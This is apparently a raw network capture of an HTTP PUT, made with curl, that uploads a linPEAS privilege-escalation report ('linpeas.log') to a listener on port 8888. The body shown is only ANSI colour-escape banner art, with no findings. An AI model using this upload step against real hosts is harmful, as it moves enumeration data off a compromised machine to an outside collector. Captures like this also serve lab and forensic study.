PUT /linpeas.log HTTP/1.1
Host: 10.6.90.119:8888
User-Agent: curl/7.52.1
Accept: */*
Content-Length: 104220
Expect: 100-continue



                            [38;2;26;43;21m▄[38;2;58;91;50m▄[48;2;116;117;116m[38;2;68;119;56m▄[48;2;98;98;98m[38;2;86;143;70m▄[48;2;98;98;98m[38;2;100;153;87m▄[48;2;63;65;63m[38;2;102;164;86m▄[48;2;46;49;44m[38;2;98;168;79m▄[48;2;43;45;43m[38;2;91;155;75m▄[48;2;61;62;61m[38;2;78;137;63m▄[48;2;102;101;102m[38;2;64;112;52m▄[0m[38;2;38;67;32m▄[38;2;20;35;16m▄[38;2;10;20;8m▄[38;2;15;21;13m▄[0m
                    [38;2;49;80;41m▄[38;2;73;133;59m▄[48;2;20;21;20m[38;2;91;163;72m▄[48;2;14;27;12m[38;2;96;174;76m▄[48;2;51;92;41m[38;2;98;177;78m▄[48;2;86;155;68m[38;2;98;177;78m▄[48;2;96;173;77m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;178;78m[38;2;98;177;78m▄[48;2;97;175;76m[38;2;98;177;78m▄[48;2;93;168;74m[38;2;98;177;78m▄[48;2;99;163;83m[38;2;97;177;77m▄[48;2;99;151;86m[38;2;98;177;78m▄[48;2;35;57;29m[38;2;98;176;78m▄[48;2;19;21;19m[38;2;94;169;75m▄[0m[38;2;70;125;56m▄[0m
             [38;2;42;65;36m▄[38;2;62;106;52m▄[48;2;94;95;94m[38;2;86;152;70m▄[48;2;57;72;53m[38;2;96;174;77m▄[48;2;57;96;47m[38;2;98;177;78m▄[48;2;78;136;62m[38;2;98;177;78m▄[48;2;95;167;76m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;77m▄[48;2;98;177;78m[38;2;91;165;72m▄[48;2;98;177;78m[38;2;76;137;60m▄[48;2;98;177;78m[38;2;54;97;42m▄[48;2;99;179;79m[38;2;39;71;30m▄[48;2;100;181;79m[38;2;35;60;30m▄[48;2;101;181;81m[38;2;42;66;37m▄[48;2;100;177;80m[38;2;52;73;45m▄[48;2;95;175;76m[38;2;47;75;40m▄[48;2;94;178;73m[38;2;41;75;33m▄[48;2;98;179;78m[38;2;42;73;34m▄[48;2;99;180;79m[38;2;40;70;33m▄[48;2;99;179;78m[38;2;44;75;36m▄[48;2;97;177;77m[38;2;55;93;46m▄[48;2;97;176;77m[38;2;65;113;52m▄[48;2;98;177;78m[38;2;79;141;63m▄[48;2;98;177;78m[38;2;93;166;75m▄[48;2;98;177;78m[38;2;99;177;79m▄[48;2;98;177;78m[38;2;97;177;78m▄[48;2;98;177;78m[38;2;97;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;94;170;75m[38;2;98;177;78m▄[48;2;71;128;56m[38;2;98;177;78m▄[48;2;34;56;28m[38;2;97;175;77m▄[48;2;64;66;64m[38;2;78;140;62m▄[0m
         [48;2;66;112;54m[38;2;98;177;78m▄[48;2;80;133;66m[38;2;98;177;78m▄[48;2;95;162;76m[38;2;98;177;78m▄[48;2;96;171;76m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m[38;2;96;174;76m▄[48;2;98;177;78m[38;2;74;130;59m▄[48;2;98;176;78m[38;2;32;49;27m▄[48;2;95;166;76m[38;2;18;29;15m▄[48;2;73;126;59m[38;2;65;113;53m▄[48;2;40;62;34m[38;2;107;209;83m▄[48;2;23;43;19m[38;2;77;220;42m▄[48;2;32;72;22m[38;2;72;218;36m▄[48;2;55;155;30m[38;2;73;217;37m▄[48;2;71;203;38m[38;2;73;217;37m▄[48;2;79;212;46m[38;2;73;218;37m▄[48;2;81;216;48m[38;2;73;218;37m▄[48;2;82;220;48m[38;2;73;218;37m▄[48;2;79;221;44m[38;2;73;218;37m▄[48;2;76;219;40m[38;2;73;218;37m▄[48;2;76;218;40m[38;2;73;218;37m▄[48;2;75;213;41m[38;2;73;218;37m▄[48;2;79;203;48m[38;2;73;218;37m▄[48;2;76;175;52m[38;2;73;218;37m▄[48;2;52;127;33m[38;2;73;218;37m▄[48;2;29;75;18m[38;2;73;217;37m▄[48;2;19;45;12m[38;2;73;218;36m▄[48;2;45;74;38m[38;2;65;196;33m▄[48;2;76;127;62m[38;2;44;132;24m▄[48;2;90;158;72m[38;2;16;45;10m▄[48;2;97;175;77m[38;2;28;50;22m▄[48;2;98;177;78m[38;2;80;145;64m▄[48;2;98;177;78m[38;2;97;175;77m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m[38;2;98;177;77m▄[48;2;97;173;78m[38;2;98;177;78m▄[48;2;69;114;56m[38;2;98;177;78m▄[48;2;30;38;28m[38;2;103;179;83m▄[0m[38;2;99;149;87m▄[0m
         [48;2;98;177;78m[38;2;98;177;77m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;178;78m▄[48;2;98;177;78m[38;2;98;178;78m▄[48;2;98;177;78m[38;2;83;150;66m▄[48;2;98;177;78m[38;2;44;80;34m▄[48;2;99;179;78m[38;2;33;49;28m▄[48;2;87;159;69m[38;2;68;97;61m▄[48;2;46;84;37m[38;2;87;165;68m▄[48;2;25;37;21m[38;2;83;208;52m▄[48;2;59;131;42m[38;2;73;219;37m▄[48;2;74;199;43m[38;2;74;223;37m▄[48;2;72;213;38m[38;2;67;204;35m▄[48;2;73;218;37m[38;2;55;171;29m▄[48;2;72;218;36m[38;2;59;136;22m▄[48;2;72;218;36m[38;2;103;132;15m▄[48;2;73;219;37m[38;2;149;133;9m▄[48;2;72;220;37m[38;2;168;130;7m▄[48;2;73;220;37m[38;2;167;118;5m▄[48;2;72;218;37m[38;2;106;78;4m▄[48;2;69;210;36m[38;2;93;69;4m▄[48;2;66;199;34m[38;2;173;117;4m▄[48;2;63;192;32m[38;2;177;119;4m▄[48;2;62;186;32m[38;2;173;116;4m▄[48;2;61;186;31m[38;2;176;115;4m▄[48;2;63;191;32m[38;2;174;115;4m▄[48;2;67;202;34m[38;2;170;113;4m▄[48;2;70;213;36m[38;2;180;118;3m▄[48;2;72;219;37m[38;2;175;117;4m▄[48;2;73;220;37m[38;2;154;120;7m▄[48;2;73;220;37m[38;2;80;94;11m▄[48;2;73;219;37m[38;2;48;93;15m▄[48;2;73;218;37m[38;2;41;112;19m▄[48;2;72;215;36m[38;2;45;144;25m▄[48;2;64;192;32m[38;2;63;191;32m▄[48;2;32;99;16m[38;2;73;218;37m▄[48;2;21;41;16m[38;2;72;210;38m▄[48;2;38;66;30m[38;2;67;177;41m▄[48;2;79;141;63m[38;2;53;123;36m▄[48;2;98;178;78m[38;2;32;57;25m▄[48;2;98;179;77m[38;2;25;46;20m▄[48;2;97;177;77m[38;2;56;100;46m▄[48;2;98;177;78m[38;2;93;165;75m▄[48;2;97;176;77m[38;2;100;181;80m▄[48;2;98;177;77m[38;2;97;176;76m▄[48;2;97;176;78m[38;2;98;177;78m▄[48;2;99;174;79m[38;2;98;177;78m▄[0m
         [48;2;98;178;78m[38;2;46;76;38m▄[48;2;100;178;80m[38;2;50;69;45m▄[48;2;99;176;80m[38;2;35;46;33m▄[48;2;82;148;65m[38;2;7;9;6m▄[48;2;64;117;50m[38;2;35;54;30m▄[48;2;42;77;34m[38;2;52;107;39m▄[48;2;26;46;21m[38;2;80;194;52m▄[48;2;34;71;26m[38;2;73;216;38m▄[48;2;54;133;35m[38;2;67;192;32m▄[48;2;81;199;52m[38;2;81;158;23m▄[48;2;80;218;46m[38;2;100;110;11m▄[48;2;66;199;33m[38;2;152;98;2m▄[48;2;60;157;26m[38;2;220;129;1m▄[48;2;80;128;18m[38;2;251;145;0m▄[48;2;120;110;9m[38;2;255;147;0m▄[48;2;154;106;4m[38;2;255;147;0m▄[48;2;181;114;2m[38;2;255;147;0m▄[48;2;230;134;0m[38;2;255;147;0m▄[48;2;251;144;0m[38;2;255;147;0m▄[48;2;254;146;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;163;94;0m[38;2;134;78;0m▄[48;2;2;1;0m[38;2;58;33;0m▄[48;2;13;7;0m[38;2;133;76;0m▄[48;2;64;38;0m[38;2;12;7;0m▄[48;2;250;144;0m[38;2;234;135;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;249;146;0m[38;2;255;147;0m▄[48;2;239;143;2m[38;2;255;147;0m▄[48;2;223;131;1m[38;2;255;147;0m▄[48;2;192;120;2m[38;2;255;147;0m▄[48;2;130;96;5m[38;2;255;147;0m▄[48;2;82;88;9m[38;2;255;148;0m▄[48;2;62;104;15m[38;2;247;147;1m▄[48;2;49;132;22m[38;2;212;134;3m▄[48;2;57;165;32m[38;2;144;95;3m▄[48;2;53;117;38m[38;2;74;61;8m▄[48;2;50;97;39m[38;2;47;60;21m▄[48;2;35;56;29m[38;2;47;81;33m▄[48;2;17;22;15m[38;2;20;34;19m▄[48;2;31;50;26m[38;2;48;73;42m▄[48;2;55;90;47m[38;2;37;56;33m▄[48;2;78;132;64m[38;2;21;31;18m▄[48;2;95;167;78m[38;2;18;26;16m▄[0m
         [48;2;48;74;43m[38;2;51;78;45m▄[48;2;48;74;43m[38;2;50;76;44m▄[48;2;46;71;42m[38;2;12;17;11m▄[48;2;32;54;28m[38;2;45;93;35m▄[48;2;58;112;46m[38;2;26;45;17m▄[48;2;55;130;37m[38;2;121;83;5m▄[48;2;57;133;27m[38;2;232;138;0m▄[48;2;101;96;8m[38;2;253;146;0m▄[48;2;200;118;1m[38;2;254;147;0m▄[48;2;248;144;0m[38;2;255;147;0m▄[48;2;254;147;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;173;100;0m[38;2;210;122;0m▄[48;2;172;100;0m[38;2;76;44;0m▄[48;2;214;123;0m[38;2;153;88;0m▄[48;2;36;21;0m[38;2;162;94;0m▄[48;2;201;116;0m[38;2;20;12;0m▄[48;2;254;147;0m[38;2;238;137;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;255;147;0m▄[48;2;241;143;1m[38;2;255;147;0m▄[48;2;213;125;0m[38;2;255;147;0m▄[48;2;117;73;3m[38;2;252;147;1m▄[48;2;25;36;21m[38;2;94;69;18m▄[48;2;50;77;44m[38;2;39;59;33m▄[48;2;51;78;45m [48;2;51;78;44m[38;2;51;78;45m▄[0m
         [48;2;51;78;45m[38;2;50;76;44m▄[48;2;40;58;34m[38;2;43;36;13m▄[48;2;38;37;6m[38;2;240;143;2m▄[48;2;149;95;6m[38;2;254;147;0m▄[48;2;226;134;1m[38;2;255;147;0m▄[48;2;253;146;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;243;140;0m▄[48;2;116;67;0m[38;2;90;52;0m▄[48;2;237;137;0m[38;2;254;147;0m▄[48;2;248;143;0m[38;2;255;147;0m▄[48;2;250;144;0m[38;2;255;147;0m▄[48;2;45;25;0m[38;2;191;110;0m▄[48;2;64;36;0m[38;2;32;18;0m▄[48;2;245;141;0m[38;2;152;87;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;255;147;0m▄[48;2;230;140;6m[38;2;254;147;0m▄[48;2;25;21;7m[38;2;143;86;2m▄[48;2;48;74;42m[38;2;39;60;34m▄[48;2;51;78;45m [0m
         [48;2;41;63;37m[38;2;40;47;23m▄[48;2;119;70;1m[38;2;230;135;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;180;104;0m[38;2;120;68;0m▄[48;2;135;78;0m[38;2;158;91;0m▄[48;2;255;147;0m[38;2;250;145;0m▄[48;2;255;147;0m [48;2;255;147;0m[38;2;254;146;0m▄[48;2;252;145;0m[38;2;209;120;0m▄[48;2;54;31;0m[38;2;61;35;0m▄[48;2;94;54;0m[38;2;159;91;0m▄[48;2;254;146;0m[38;2;244;140;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;240;144;1m[38;2;255;147;0m▄[48;2;36;40;18m[38;2;70;49;6m▄[48;2;50;78;45m[38;2;45;69;40m▄[0m
         [48;2;65;48;9m[38;2;98;64;6m▄[48;2;255;149;0m[38;2;255;147;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;254;146;0m▄[48;2;225;130;0m[38;2;175;100;0m▄[48;2;210;120;0m[38;2;253;146;0m▄[48;2;209;121;0m[38;2;254;147;0m▄[48;2;86;49;0m[38;2;189;109;0m▄[48;2;254;146;0m[38;2;142;81;0m▄[48;2;255;147;0m[38;2;102;59;0m▄[48;2;199;115;0m[38;2;69;40;0m▄[48;2;244;141;0m[38;2;238;138;0m▄[48;2;253;146;0m[38;2;184;105;0m▄[48;2;200;115;0m[38;2;231;134;0m▄[48;2;253;147;0m[38;2;254;146;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;149;98;7m[38;2;215;132;5m▄[48;2;35;54;32m[38;2;31;42;22m▄[0m
         [48;2;133;82;3m[38;2;153;89;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;255;146;0m▄[48;2;255;147;0m[38;2;255;146;0m▄[48;2;255;147;0m [48;2;255;147;0m[38;2;254;148;0m▄[48;2;255;147;0m[38;2;248;147;0m▄[48;2;254;147;0m[38;2;242;142;0m▄[48;2;204;116;0m[38;2;224;131;0m▄[48;2;200;115;0m[38;2;205;124;1m▄[48;2;199;115;0m[38;2;175;109;2m▄[48;2;172;100;0m[38;2;157;102;2m▄[48;2;168;97;0m[38;2;172;114;3m▄[48;2;206;119;0m[38;2;156;115;5m▄[48;2;215;125;0m[38;2;138;111;7m▄[48;2;180;105;0m[38;2;121;105;8m▄[48;2;233;136;0m[38;2;120;109;8m▄[48;2;254;148;0m[38;2;116;111;9m▄[48;2;254;148;0m[38;2;112;111;10m▄[48;2;255;148;0m[38;2;130;121;10m▄[48;2;254;148;0m[38;2;103;105;10m▄[48;2;254;148;0m[38;2;99;99;9m▄[48;2;254;148;0m[38;2;106;98;8m▄[48;2;254;148;0m[38;2;106;96;8m▄[48;2;255;148;0m[38;2;118;98;7m▄[48;2;255;147;0m[38;2;123;101;7m▄[48;2;255;147;0m[38;2;129;99;6m▄[48;2;255;147;0m[38;2;141;100;5m▄[48;2;255;147;0m[38;2;166;111;4m▄[48;2;255;147;0m[38;2;189;122;4m▄[48;2;255;147;0m[38;2;217;131;1m▄[48;2;255;147;0m[38;2;248;145;0m▄[48;2;255;147;0m[38;2;250;148;0m▄[48;2;255;147;0m[38;2;254;149;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;249;147;1m[38;2;254;147;0m▄[48;2;47;44;15m[38;2;81;54;7m▄[0m
         [48;2;163;95;0m[38;2;176;103;0m▄[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;254;147;0m▄[48;2;255;147;0m[38;2;250;144;0m▄[48;2;255;147;0m[38;2;238;146;1m▄[48;2;254;147;0m[38;2;170;117;4m▄[48;2;252;147;0m[38;2;78;65;5m▄[48;2;239;144;1m[38;2;36;71;11m▄[48;2;220;136;2m[38;2;41;122;21m▄[48;2;193;124;2m[38;2;59;179;31m▄[48;2;178;119;4m[38;2;69;210;35m▄[48;2;129;104;6m[38;2;73;219;37m▄[48;2;67;87;10m[38;2;73;219;37m▄[48;2;61;106;15m[38;2;73;218;37m▄[48;2;52;126;21m[38;2;73;218;37m▄[48;2;52;150;25m[38;2;73;218;37m▄[48;2;58;177;30m[38;2;73;218;37m▄[48;2;63;194;33m[38;2;73;218;37m▄[48;2;66;204;34m[38;2;73;218;37m▄[48;2;69;212;36m[38;2;73;218;37m▄[48;2;72;217;36m[38;2;73;218;37m▄[48;2;72;219;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;74;220;37m[38;2;73;218;37m▄[48;2;73;220;37m[38;2;73;218;37m▄[48;2;73;219;37m[38;2;73;218;37m▄[48;2;72;214;36m[38;2;73;218;37m▄[48;2;68;207;35m[38;2;73;218;37m▄[48;2;65;197;34m[38;2;73;218;37m▄[48;2;61;185;32m[38;2;73;218;37m▄[48;2;51;157;27m[38;2;73;218;37m▄[48;2;41;125;21m[38;2;73;218;37m▄[48;2;40;106;18m[38;2;73;218;37m▄[48;2;75;92;10m[38;2;73;218;37m▄[48;2;76;85;10m[38;2;73;219;37m▄[48;2;112;94;7m[38;2;72;216;36m▄[48;2;162;113;5m[38;2;64;194;33m▄[48;2;219;131;0m[38;2;50;152;26m▄[48;2;231;138;1m[38;2;30;65;14m▄[48;2;252;147;0m[38;2;106;71;5m▄[48;2;97;61;4m[38;2;30;31;7m▄[0m
         [48;2;186;108;0m[38;2;185;108;0m▄[48;2;255;147;0m[38;2;254;148;0m▄[48;2;255;147;0m[38;2;247;144;0m▄[48;2;255;147;0m[38;2;188;113;1m▄[48;2;255;147;0m[38;2;110;100;8m▄[48;2;248;147;0m[38;2;72;136;20m▄[48;2;206;124;1m[38;2;62;175;29m▄[48;2;115;81;4m[38;2;67;204;34m▄[48;2;55;92;13m[38;2;72;217;36m▄[48;2;60;157;26m[38;2;73;218;37m▄[48;2;66;195;32m[38;2;73;218;37m▄[48;2;70;212;35m[38;2;73;218;37m▄[48;2;72;215;36m[38;2;73;218;37m▄[48;2;73;217;36m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;71;210;37m[38;2;71;214;37m▄[48;2;58;142;37m[38;2;57;136;37m▄[48;2;51;109;39m[38;2;54;109;40m▄[48;2;36;76;26m[38;2;38;71;31m▄[0m
         [48;2;73;63;12m[38;2;24;46;20m▄[48;2;89;67;7m[38;2;54;120;38m▄[48;2;67;119;19m[38;2;66;192;35m▄[48;2;61;177;29m[38;2;73;217;37m▄[48;2;71;213;36m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;71;214;35m[38;2;42;129;21m▄[48;2;43;131;22m[38;2;4;10;2m▄[48;2;37;111;19m[38;2;4;10;2m▄[48;2;60;180;30m[38;2;7;22;3m▄[48;2;73;218;37m[38;2;62;187;31m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;72;217;36m▄[48;2;69;208;35m[38;2;20;61;10m▄[48;2;43;129;22m[38;2;4;11;2m▄[48;2;38;116;19m[38;2;3;8;1m▄[48;2;64;192;32m[38;2;19;57;10m▄[48;2;73;218;37m[38;2;73;219;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;214;36m[38;2;71;213;36m▄[48;2;55;130;37m[38;2;55;123;38m▄[48;2;54;108;41m[38;2;56;110;44m▄[48;2;35;60;30m[38;2;35;57;30m▄[0m
         [48;2;37;68;29m[38;2;38;61;33m▄[48;2;58;132;39m[38;2;62;134;45m▄[48;2;64;179;36m[38;2;55;129;37m▄[48;2;72;217;36m[38;2;71;210;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;27;82;14m[38;2;59;178;30m▄[48;2;4;11;3m[38;2;3;9;1m▄[48;2;0;0;0m[38;2;8;18;4m▄[48;2;1;3;1m[38;2;4;12;2m▄[48;2;36;112;19m[38;2;54;163;27m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;70;210;36m[38;2;72;217;36m▄[48;2;4;11;1m[38;2;9;28;4m▄[48;2;0;0;0m[38;2;6;16;3m▄[48;2;1;3;1m[38;2;6;15;3m▄[48;2;13;39;6m[38;2;32;94;15m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;70;207;36m[38;2;67;196;36m▄[48;2;52;110;38m [48;2;57;101;47m[38;2;56;90;47m▄[48;2;36;55;31m[38;2;38;58;33m▄[0m
         [48;2;40;63;35m[38;2;43;67;38m▄[48;2;61;117;48m[38;2;45;80;38m▄[48;2;54;114;39m[38;2;52;110;38m▄[48;2;64;177;36m[38;2;59;150;37m▄[48;2;72;217;36m[38;2;72;214;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;73;218;37m▄[48;2;61;182;30m[38;2;73;218;37m▄[48;2;45;135;22m[38;2;73;218;37m▄[48;2;58;174;29m[38;2;73;218;37m▄[48;2;72;217;36m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;71;212;35m[38;2;72;216;36m▄[48;2;34;101;17m[38;2;11;32;5m▄[48;2;34;101;17m[38;2;1;2;1m▄[48;2;34;98;18m[38;2;1;3;1m▄[48;2;35;101;18m[38;2;1;1;1m▄[48;2;35;100;17m[38;2;1;3;1m▄[48;2;57;170;29m[38;2;56;168;28m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;72;218;36m▄[48;2;66;197;33m[38;2;72;217;36m▄[48;2;46;139;23m[38;2;73;217;37m▄[48;2;54;163;27m[38;2;72;217;37m▄[48;2;71;212;36m[38;2;72;217;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;37m[38;2;70;204;36m▄[48;2;60;158;37m[38;2;53;122;37m▄[48;2;52;103;38m[38;2;52;104;40m▄[48;2;33;54;28m[38;2;21;34;18m▄[48;2;46;70;41m[38;2;49;76;44m▄[0m
         [48;2;49;76;44m[38;2;51;78;45m▄[48;2;32;51;28m[38;2;43;65;37m▄[48;2;61;125;45m[38;2;81;124;71m▄[48;2;54;124;38m[38;2;53;113;40m▄[48;2;68;202;36m[38;2;60;156;37m▄[48;2;73;218;37m[38;2;72;215;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;216;37m▄[48;2;73;217;37m[38;2;93;205;61m▄[48;2;79;213;44m[38;2;121;189;95m▄[48;2;85;210;51m[38;2;132;184;108m▄[48;2;82;211;47m[38;2;121;191;93m▄[48;2;73;217;37m[38;2;85;210;52m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;37;111;20m[38;2;71;214;36m▄[48;2;1;2;0m[38;2;44;128;22m▄[48;2;2;4;2m[38;2;15;39;8m▄[48;2;1;1;1m[38;2;29;82;14m▄[48;2;13;37;7m[38;2;68;204;34m▄[48;2;70;210;35m[38;2;73;218;37m▄[48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;217;37m[38;2;74;216;38m▄[48;2;82;211;47m[38;2;118;191;90m▄[48;2;100;200;70m[38;2;132;185;108m▄[48;2;103;201;72m[38;2;127;187;101m▄[48;2;98;203;67m[38;2;125;189;100m▄[48;2;85;209;52m[38;2;116;192;88m▄[48;2;73;217;37m[38;2;80;211;44m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;68;200;35m▄[48;2;63;170;35m[38;2;54;125;36m▄[48;2;51;103;38m[38;2;51;99;38m▄[48;2;49;101;36m[38;2;22;45;17m▄[48;2;30;47;26m[38;2;45;69;39m▄[48;2;51;78;45m [0m
         [48;2;51;78;45m [48;2;49;75;43m[38;2;51;78;45m▄[48;2;30;38;27m[38;2;39;59;35m▄[48;2;63;123;49m[38;2;71;110;62m▄[48;2;54;121;37m[38;2;56;119;40m▄[48;2;68;198;37m[38;2;60;158;37m▄[48;2;73;218;37m[38;2;71;216;36m▄[48;2;73;217;37m[38;2;73;216;38m▄[48;2;91;206;58m[38;2;110;196;81m▄[48;2;122;191;95m[38;2;126;188;100m▄[48;2;128;186;102m[38;2;130;187;104m▄[48;2;140;180;116m[38;2;128;187;103m▄[48;2;126;188;100m[38;2;106;197;76m▄[48;2;96;202;64m[38;2;75;215;39m▄[48;2;73;217;37m[38;2;72;218;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;74;220;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m 